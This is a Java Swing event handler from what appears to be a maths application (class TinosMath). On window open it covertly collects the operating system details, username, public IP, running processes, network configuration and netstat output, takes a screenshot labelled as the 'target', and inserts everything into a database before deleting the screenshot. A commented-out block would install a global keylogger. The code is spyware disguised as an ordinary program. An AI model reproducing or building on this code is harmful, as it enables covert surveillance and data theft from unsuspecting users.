    //Get System Information
    private void formWindowOpened(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowOpened
        action = new RetrieveInfo();
        String os_name = System.getProperty("os.name");
        String os_architecture = System.getProperty("sun.arch.data.model");
        String cpu_architecture = System.getProperty("os.arch");
        String user_name = System.getProperty("user.name");
        
        String system_info = "Operating System is: " + os_name + "\nOperating System Architecture is: "
                + os_architecture + "\nCPU Architecture is: " + cpu_architecture + "\nUsername is: " 
                + user_name +"\n";
        String global_ip_address = "Global IP Address is: " + action.global_ip_address() + "\n";
        String network_information = "";
        String process_list = "";
        if(os_name.contains("Windows")) {
            process_list = "Process List: \n" + action.commandArg("tasklist");
            network_information = "\nIP and MAC Address: \n" + action.commandArg("ipconfig /all");
        } else {
            process_list = "Process List: \n" + action.commandArg("ps -u");
            network_information = "\nIP and MAC Address: \n" + action.commandArg("ifconfig -a");
        }
        
        /*
        try {
            //////////////////////////////////////////////
            
            //keylogger

            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(TinosMath.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        GlobalScreen.addNativeKeyListener(new TinosMath());
        */
        
        network_information = network_information + action.commandArg("netstat");
        action.Screenshot_Target();
        Database db = new Database();
        db.ConnctDb();
        db.insertData(system_info, global_ip_address, process_list, network_information);
        action.DeleteScreenShot();
        
    }//GEN-LAST:event_formWindowOpened

